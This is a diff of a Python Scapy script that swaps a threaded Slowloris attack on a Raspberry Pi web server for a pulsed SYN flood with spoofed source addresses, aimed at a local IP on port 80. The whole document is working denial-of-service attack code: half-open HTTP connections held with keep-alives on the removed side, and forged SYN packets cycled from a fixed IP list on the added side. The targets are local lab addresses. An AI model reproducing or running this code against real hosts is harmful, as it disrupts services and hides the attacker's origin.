@@ -1,88 +1,63 @@
 from scapy.all import *
 import random
-import threading
-import time
-import sys
 import socket
+import time
+import itertools
 
-# Configuration
-target_host = "raspberrypi.local"  # Raspberry Pi's hostname
-target_port = 80                  # Default HTTP port
-num_connections = 200             # Number of connections to simulate
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
+# Target hostname and port
+target_ip = "192.168.43.108"  # Pi's hostname
+target_port = 80  # Common port (HTTP)
+
+
+
+# Fixed IP address list
+FIXED_IPS = [
+     "10.0.0.101",
+    "10.0.0.102",
+    "10.0.0.103",
+    "10.0.0.104",
+    "10.0.0.105",
+    "10.0.0.106",
+    "10.0.0.107",
+    "10.0.0.108",
+    "10.0.0.109",
+    "10.0.0.110"
+    
 ]
 
-# Resolve hostname to IP (for logging and validation)
-try:
-    target_ip = socket.gethostbyname(target_host)
-    print(f"[*] Resolved {target_host} to {target_ip}")
-except socket.gaierror:
-    print(f"[-] Could not resolve hostname {target_host}. Check your network or hostname.")
-    sys.exit(1)
+# Create infinite iterator for fixed IPs
+ip_cycle = itertools.cycle(FIXED_IPS)
 
-# Function to create a partial HTTP request
-def build_partial_request():
-    ua = random.choice(user_agents)
-    request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {ua}\r\nAccept: text/html\r\nConnection: keep-alive\r\n"
-    return request
-
-# Function to simulate a single Slowloris connection
-def slowloris_connection():
+# Function to send SYN packets for a duration, then pause
+def syn_flood(pulse_duration=4, pause_duration=4):
     try:
-        # Create a TCP socket using Scapy with hostname
-        ip = IP(dst=target_host)  # Scapy will resolve the hostname
-        syn = ip / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
-        syn_ack =  sr1(syn, timeout=5, retry=2, verbose=0)  # Increased timeout + retries
-
-        
-        if not syn_ack or syn_ack[TCP].flags != "SA":
-            print("[-] Failed to establish connection")
-            return
-        
-        # Complete the handshake
-        ack = ip / TCP(sport=syn[TCP].sport, dport=target_port, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
-        send(ack, verbose=0)
-        
-        # Send partial HTTP request
-        partial_request = build_partial_request()
-        packet = ip / TCP(sport=syn[TCP].sport, dport=target_port, flags="PA", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1) / partial_request
-        send(packet, verbose=0)
-        print(f"[+] Connection established from port {syn[TCP].sport}, keeping alive...")
-        
-        # Keep the connection alive by sending small chunks periodically
         while True:
-            time.sleep(10)  # Send keep-alive every 10 seconds
-            keep_alive = ip / TCP(sport=syn[TCP].sport, dport=target_port, flags="PA", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1) / "\r\n"
-            send(keep_alive, verbose=0)
-            
-    except Exception as e:
-        print(f"[-] Error in connection: {e}")
+            print(f"Starting SYN flood for {pulse_duration} seconds...")
+            start_time = time.time()
 
-# Main function to launch multiple connections
-def start_slowloris():
-    print(f"[*] Starting Slowloris simulation against {target_host}:{target_port}")
-    print(f"[*] Launching {num_connections} connections...")
-    
-    threads = []
-    for _ in range(num_connections):
-        t = threading.Thread(target=slowloris_connection)
-        t.daemon = True  # Allows program to exit with Ctrl+C
-        t.start()
-        threads.append(t)
-        time.sleep(0.1)  # Small delay to avoid overwhelming the system
-    
-    # Keep the main thread running
-    try:
-        for t in threads:
-            t.join()
+            while time.time() - start_time < pulse_duration:
+                # Get next fixed IP from iterator
+                src_ip = next(ip_cycle)
+                src_port = random.randint(1024, 65535)
+
+                # Craft SYN packet
+                ip = IP(src=src_ip, dst=target_ip)
+                tcp = TCP(sport=src_port, dport=target_port, flags="S")
+                packet = ip / tcp
+
+                # Send packet
+                send(packet, verbose=0)
+                print(f"Sent SYN packet from {src_ip}:{src_port}")
+
+            print(f"Pausing for {pause_duration} seconds...\n")
+            time.sleep(pause_duration)  # Wait before the next pulse
+
     except KeyboardInterrupt:
-        print("\n[*] Stopping Slowloris simulation...")
-        sys.exit(0)
+        print("\nStopped by user")
+    except Exception as e:
+        print(f"Error: {e}")
 
+# Run the attack in pulses
 if __name__ == "__main__":
-    
-    
-    start_slowloris()
+    syn_flood()
+
